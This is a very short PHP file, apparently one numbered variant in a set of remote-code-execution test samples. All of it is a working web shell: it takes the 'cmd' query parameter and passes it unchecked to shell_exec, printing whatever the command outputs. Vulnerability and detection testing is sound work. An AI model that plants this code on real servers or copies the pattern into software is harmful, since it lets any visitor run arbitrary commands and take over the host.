<?php
// RCE test variation #382
$cmd = $_GET['cmd'] ?? 'ls';
echo shell_exec($cmd);
?>